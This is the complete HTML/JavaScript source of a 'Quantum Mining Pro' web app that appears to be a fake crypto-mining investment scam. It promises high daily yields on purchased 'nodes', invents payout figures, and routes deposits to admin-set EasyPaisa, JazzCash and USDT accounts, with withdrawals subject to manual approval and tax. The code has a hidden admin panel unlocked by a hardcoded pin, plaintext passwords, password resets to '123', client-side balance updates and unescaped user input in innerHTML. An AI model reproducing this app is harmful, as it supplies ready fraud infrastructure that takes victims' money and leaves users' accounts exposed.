<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | Quantum Mining Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0F172A; }
        body { background: #F8FAFC; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        .premium-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.02); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 14px; font-weight: 800; transition: 0.3s; cursor: pointer; border: none; }
        .btn-gold:active { transform: scale(0.95); }
        .screen { display: none; }
        .active-screen { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 12px 5px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 8px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; transition: 0.2s; }
        .nav-item.active { color: var(--gold); }
        .ticker-bg { background: var(--dark); color: white; padding: 6px 0; font-size: 9px; font-weight: 800; overflow: hidden; }
        input { border: 1px solid #e2e8f0 !important; }
    </style>
</head>
<body>

    <div class="ticker-bg">
        <marquee scrollamount="5">⚡ SYSTEM ONLINE: Mining nodes active across 14 regions • $2.4M total payouts processed • Global support available 24/7 via Telegram and WhatsApp ⚡</marquee>
    </div>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white min-h-screen flex flex-col justify-center">
            <h1 class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[6px] mt-2 mb-10">Institutional Infrastructure</p>
            
            <div class="bg-slate-50 p-6 rounded-2xl mb-8 text-left border border-slate-100">
                <h3 class="text-[10px] font-black uppercase mb-1">About Company</h3>
                <p class="text-[10px] text-slate-500 leading-relaxed">Nova Corp provides high-yield quantum mining solutions. We manage hardware so you can earn daily rewards securely on the blockchain.</p>
            </div>

            <div class="space-y-4 max-w-xs mx-auto w-full">
                <input type="text" id="u-id" placeholder="Username" class="w-full p-4 rounded-xl outline-none focus:ring-1 focus:ring-[#D4AF37]">
                <input type="password" id="u-pw" placeholder="Password" class="w-full p-4 rounded-xl outline-none focus:ring-1 focus:ring-[#D4AF37]">
                <button onclick="handleAuth()" class="w-full btn-gold py-4 uppercase text-xs tracking-widest">Login / Register</button>
                <p onclick="toggleMode()" id="mode-text" class="text-[10px] text-slate-400 font-bold uppercase cursor-pointer underline">New? Create Account</p>
            </div>

            <div class="mt-10 flex justify-center gap-8">
                <a id="wa-link" href="#" target="_blank" class="text-slate-400 hover:text-green-500"><i class="fa-brands fa-whatsapp text-2xl"></i></a>
                <a id="tg-link" href="#" target="_blank" class="text-slate-400 hover:text-blue-500"><i class="fa-brands fa-telegram text-2xl"></i></a>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b border-slate-100 sticky top-0 z-[100]">
            <h2 id="logo-main" class="font-black text-2xl tracking-tighter cursor-pointer select-none">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="text-right">
                <p id="user-tag" class="text-[10px] font-black uppercase">@USER</p>
                <p id="user-status" class="text-[8px] font-bold text-green-500 uppercase">Miner Active</p>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6 pb-24">
            <div class="bg-slate-900 rounded-[32px] p-8 mb-6 text-white shadow-2xl relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[8px] text-slate-400 font-bold uppercase tracking-widest mb-1">Available Funds</p>
                    <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-8">$0.00</h1>
                    <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                        <div><p class="text-[7px] text-slate-500 font-bold uppercase">Today's Profit</p><p id="b-daily" class="text-lg font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[7px] text-slate-500 font-bold uppercase">Total Profit</p><p id="b-total" class="text-lg font-black text-[#D4AF37]">$0.00</p></div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="premium-card p-6 flex flex-col items-center gap-2"><i class="fa-solid fa-circle-plus text-[#D4AF37] text-xl"></i><span class="text-[10px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-6 flex flex-col items-center gap-2"><i class="fa-solid fa-money-bill-transfer text-slate-400 text-xl"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6 pb-24">
            <h2 class="text-xl font-black mb-6 text-center uppercase tracking-tight">Mining <span class="text-[#D4AF37]">Hardware</span></h2>
            <div id="nodes-grid" class="grid grid-cols-1 gap-4"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6 pb-24">
            <h2 class="text-xl font-black mb-6 text-center uppercase">Transaction <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="logs-list" class="space-y-3"></div>
        </div>

        <div id="page-admin" class="screen px-4 pt-6 pb-24">
            <h2 class="text-xl font-black mb-6 text-red-600 uppercase">Command Center</h2>
            
            <div class="premium-card p-5 mb-4 bg-slate-900 text-white">
                <h3 class="text-[10px] font-bold text-slate-400 uppercase mb-4">Financial Rules</h3>
                <div class="grid grid-cols-2 gap-3 mb-3">
                    <input type="number" id="adm-min-dep" placeholder="Min Deposit" class="bg-slate-800 p-3 rounded-xl text-xs outline-none border-none">
                    <input type="number" id="adm-min-wd" placeholder="Min Withdraw" class="bg-slate-800 p-3 rounded-xl text-xs outline-none border-none">
                </div>
                <input type="number" id="adm-tax" placeholder="Tax Percentage %" class="w-full bg-slate-800 p-3 rounded-xl text-xs outline-none mb-4 border-none">
                <button onclick="saveAdminRules()" class="w-full btn-gold py-3 text-xs">Update System Rules</button>
            </div>

            <div class="premium-card p-5 mb-4">
                <h3 class="text-[10px] font-bold uppercase mb-4 text-slate-400">Payment Accounts</h3>
                <input type="text" id="adm-ep" placeholder="EasyPaisa Number" class="w-full p-3 border rounded-xl text-xs mb-2">
                <input type="text" id="adm-jc" placeholder="JazzCash Number" class="w-full p-3 border rounded-xl text-xs mb-2">
                <input type="text" id="adm-usdt" placeholder="USDT TRC20 Address" class="w-full p-3 border rounded-xl text-xs mb-4">
                <button onclick="saveAdminWallets()" class="w-full btn-gold py-3 text-xs">Save Payment Info</button>
            </div>

            <div class="premium-card p-5 mb-4">
                <h3 class="text-[10px] font-bold uppercase mb-4 text-slate-400">User Control</h3>
                <input type="text" id="adm-target-user" placeholder="Target Username" class="w-full p-3 border rounded-xl text-xs mb-3">
                <div class="flex gap-2">
                    <button onclick="adminUserAction('ban')" class="flex-1 bg-red-600 text-white py-2 rounded-xl text-[10px] font-bold">BAN</button>
                    <button onclick="adminUserAction('reset')" class="flex-1 bg-blue-600 text-white py-2 rounded-xl text-[10px] font-bold">RESET PW (123)</button>
                    <button onclick="adminUserAction('unban')" class="flex-1 bg-green-600 text-white py-2 rounded-xl text-[10px] font-bold">UNBAN</button>
                </div>
            </div>

            <h3 class="text-[10px] font-bold uppercase mb-3">Approval Requests</h3>
            <div id="adm-pending-list" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-house-user text-lg"></i><span>HOME</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-lg"></i><span>HARDWARE</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-receipt text-lg"></i><span>RECORDS</span></div>
            <div id="nav-admin-btn" onclick="nav('page-admin', this)" class="nav-item text-red-500" style="display: none;"><i class="fa-solid fa-user-shield text-lg"></i><span>ADMIN</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-lg text-red-400"></i><span>LOGOUT</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">FUND ACCOUNT</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-xl"></i></div>
        <div class="grid grid-cols-3 gap-2 mb-6">
            <button onclick="setDepMethod('EP')" class="border p-3 rounded-xl text-[9px] font-bold">EasyPaisa</button>
            <button onclick="setDepMethod('JC')" class="border p-3 rounded-xl text-[9px] font-bold">JazzCash</button>
            <button onclick="setDepMethod('USDT')" class="border p-3 rounded-xl text-[9px] font-bold">USDT</button>
        </div>
        <div id="dep-display" class="bg-slate-50 p-6 rounded-2xl text-center mb-8 hidden">
            <p id="dep-name" class="text-[8px] font-black text-slate-400 uppercase mb-1"></p>
            <p id="dep-addr" class="text-sm font-black text-slate-900"></p>
        </div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="w-full p-4 border rounded-2xl mb-4 outline-none">
        <input type="text" id="dep-txid" placeholder="Transaction Hash / ID" class="w-full p-4 border rounded-2xl mb-8 outline-none">
        <button onclick="handleFinance('Deposit')" class="w-full btn-gold py-4 text-xs">SUBMIT DEPOSIT</button>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">WITHDRAWAL</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-xl"></i></div>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="w-full p-4 border rounded-2xl mb-4 outline-none">
        <input type="text" id="wd-addr" placeholder="Account Number / Wallet" class="w-full p-4 border rounded-2xl mb-8 outline-none">
        <button onclick="handleFinance('Withdraw')" class="w-full btn-gold py-4 text-xs">REQUEST PAYOUT</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);

        let user = localStorage.getItem('nova_session');
        let isLogin = true; let admClicks = 0;
        let sys = { min_dep: 10, min_wd: 5, tax: 2, ep: "Not Set", jc: "Not Set", usdt: "Not Set", tg: "https://t.me", wa: "https://wa.me" };

        const nodes = [
            { id: 1, name: "Core S1", cost: 10, yield: 0.9, color: "#94a3b8" },
            { id: 2, name: "Alpha V2", cost: 20, yield: 2.1, color: "#10b981" },
            { id: 3, name: "Rig X-50", cost: 50, yield: 5.8, color: "#d97706" },
            { id: 4, name: "Neon 100", cost: 100, yield: 12.5, color: "#3b82f6" },
            { id: 5, name: "Gold 250", cost: 250, yield: 33.0, color: "#f59e0b" },
            { id: 6, name: "Quantum X", cost: 500, yield: 70.0, color: "#8b5cf6" }
        ];
        for(let i=7; i<=21; i++) nodes.push({ id: i, name: `Machine V${i}`, cost: 500+(i*100), yield: 70+(i*15), color: "#000" });

        // Admin Trigger logic
        document.getElementById('logo-main').onclick = () => {
            admClicks++;
            if(admClicks >= 5) {
                if(prompt("Enter Admin Secret Pin:") === "nov786") {
                    document.getElementById('nav-admin-btn').style.display = "flex";
                    alert("Admin Access Unlocked, Sweetie!");
                }
                admClicks = 0;
            }
        };

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Fill all fields");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(isLogin) {
                if(snap.exists() && snap.data().password === pw) {
                    if(snap.data().status === 'Banned') return alert("Account Banned!");
                    localStorage.setItem('nova_session', id); location.reload();
                } else alert("Invalid Credentials");
            } else {
                if(snap.exists()) return alert("User already exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [], status: 'Active' });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u) return;
                document.getElementById('user-tag').innerText = `@${id}`;
                document.getElementById('b-main').innerText = `$${(u.balance || 0).toFixed(2)}`;
                document.getElementById('b-daily').innerText = `+$${(u.daily || 0).toFixed(2)}`;
                document.getElementById('b-total').innerText = `$${(u.total_profit || 0).toFixed(2)}`;
                renderNodes(u.active_nodes || []);
            });
            onSnapshot(doc(db, "config", "master"), d => { 
                if(d.exists()) {
                    sys = d.data();
                    document.getElementById('wa-link').href = sys.wa;
                    document.getElementById('tg-link').href = sys.tg;
                }
            });
            loadLogs(id); loadAdminData();
        }

        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodes.forEach(n => {
                const isRun = active.find(a => a.nodeId === n.id);
                grid.innerHTML += `<div class="premium-card p-5 border-l-4" style="border-left-color: ${n.color}">
                    <div class="flex justify-between items-center mb-3">
                        <h4 class="font-black text-xs uppercase">${n.name}</h4>
                        <span class="text-green-500 font-bold text-xs">$${n.yield}/Day</span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-[9px] text-slate-400 font-bold">Cost: $${n.cost}</span>
                        ${isRun ? `<span class="text-[10px] font-black text-blue-500">MINING...</span>` : 
                        `<button onclick="buyNode(${n.id}, ${n.cost}, ${n.yield})" class="btn-gold px-5 py-2 text-[9px]">ACTIVATE</button>`}
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uRef = doc(db, "users", user); const snap = await getDoc(uRef);
            if(snap.data().balance < cost) return alert("Insufficient Funds");
            await updateDoc(uRef, { 
                balance: snap.data().balance - cost, 
                active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y, lastClaim: Date.now() }],
                daily: (snap.data().daily || 0) + y
            });
            alert("Hardware Activated!");
        };

        window.setDepMethod = (t) => {
            document.getElementById('dep-display').classList.remove('hidden');
            document.getElementById('dep-name').innerText = t;
            document.getElementById('dep-addr').innerText = sys[t.toLowerCase()] || "Admin not updated";
        };

        window.handleFinance = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const ref = document.getElementById(type === 'Deposit' ? 'dep-txid' : 'wd-addr').value;
            if(!amt || !ref) return alert("Fill all fields");
            if(type === 'Deposit' && amt < sys.min_dep) return alert("Min Deposit: $" + sys.min_dep);
            if(type === 'Withdraw' && amt < sys.min_wd) return alert("Min Withdrawal: $" + sys.min_wd);

            await addDoc(collection(db, "logs"), { user: user, type, amount: amt, ref, status: 'Pending', time: Date.now() });
            alert("Request Submitted!"); closeModal(type === 'Deposit' ? 'modal-dep' : 'modal-wd');
        };

        // Admin Operations
        async function loadAdminData() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const list = document.getElementById('adm-pending-list'); list.innerHTML = "";
                s.forEach(docSnap => {
                    const l = docSnap.data();
                    list.innerHTML += `<div class="premium-card p-4 text-[9px]">
                        <p><b>User:</b> ${l.user} | <b>${l.type}:</b> $${l.amount}</p>
                        <p class="text-slate-400 mb-3">Ref: ${l.ref}</p>
                        <button onclick="approveRequest('${docSnap.id}', '${l.user}', ${l.amount}, '${l.type}')" class="bg-green-500 text-white px-4 py-2 rounded-lg font-bold">APPROVE</button>
                    </div>`;
                });
            });
        }

        window.saveAdminRules = async () => {
            const up = { min_dep: parseFloat(document.getElementById('adm-min-dep').value), min_wd: parseFloat(document.getElementById('adm-min-wd').value), tax: parseFloat(document.getElementById('adm-tax').value) };
            await updateDoc(doc(db, "config", "master"), up); alert("Rules Updated!");
        };

        window.saveAdminWallets = async () => {
            const up = { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, usdt: document.getElementById('adm-usdt').value };
            await updateDoc(doc(db, "config", "master"), up); alert("Wallets Saved!");
        };

        window.adminUserAction = async (act) => {
            const target = document.getElementById('adm-target-user').value; if(!target) return;
            const uRef = doc(db, "users", target);
            if(act === 'ban') await updateDoc(uRef, { status: 'Banned' });
            if(act === 'unban') await updateDoc(uRef, { status: 'Active' });
            if(act === 'reset') await updateDoc(uRef, { password: '123' });
            alert("User Action Completed");
        };

        window.approveRequest = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const snap = await getDoc(uRef);
            if(type === 'Deposit') await updateDoc(uRef, { balance: (snap.data().balance || 0) + amt });
            if(type === 'Withdraw') {
                const deduction = amt + (amt * (sys.tax / 100)); // Tax applied on withdrawal
                if(snap.data().balance < deduction) return alert("User insufficient balance for tax");
                await updateDoc(uRef, { balance: (snap.data().balance || 0) - deduction });
            }
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
        };

        function loadLogs(id) {
            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const list = document.getElementById('logs-list'); list.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    list.innerHTML += `<div class="premium-card p-4 flex justify-between items-center">
                        <div><p class="text-[10px] font-black uppercase">${l.type}</p><p class="text-sm font-black">$${l.amount.toFixed(2)}</p></div>
                        <span class="text-[8px] font-black uppercase ${l.status === 'Pending' ? 'text-orange-500' : 'text-green-500'}">${l.status}</span>
                    </div>`;
                });
            });
        }

        window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleMode = () => { isLogin = !isLogin; document.getElementById('mode-text').innerText = isLogin ? "New? Create Account" : "Back to Login"; document.querySelector('.btn-gold').innerText = isLogin ? "Login / Register" : "Setup Master Account"; };

        if(user) initApp(user);
    </script>
</body>
</html>
